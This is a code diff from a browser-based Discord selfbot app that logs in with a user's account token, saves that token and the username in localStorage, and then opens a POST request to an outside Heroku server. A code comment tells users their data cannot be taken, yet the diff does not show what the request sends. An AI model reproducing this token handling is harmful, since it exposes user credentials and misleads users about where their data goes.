@@ -2,7 +2,6 @@ function selfbotapp() {
   var t0 = performance.now(); // begin time measurment
   resetsettings();
   const login = document.getElementById("token").value;
-  localStorage.token = login; //with this you wont have to put your token everytime, localStorage can only be red client side, so we can't take your data
   function httpGet(theUrl) {
     var xmlHttp = new XMLHttpRequest();
     xmlHttp.open("GET", theUrl, false); // false for synchronous request
@@ -61,6 +60,7 @@ function selfbotapp() {
   var footertext = "Noziro Selfbot";
   client.login(login);
   client.on("ready", () => {
+
     var t1 = performance.now(); // Ending time measurment
     var pretesttg = document.getElementById("selfboton").innerHTML;
     /* console.log(
@@ -80,6 +80,10 @@ function selfbotapp() {
     $(".dank-ass-loader").fadeOut();
     $("#connected").fadeIn();
     document.getElementById("username").innerHTML = client.user.tag;
+
+
+    localStorage.token = login; //with this you wont have to put your token everytime, localStorage can only be red client side, so we can't take your data
+    localStorage.username = document.getElementById("username").innerHTML;
     var xhr = new XMLHttpRequest();
     xhr.open("POST", "https://noziro.herokuapp.com/new", true);
     xhr.setRequestHeader("Content-Type", "application/json");
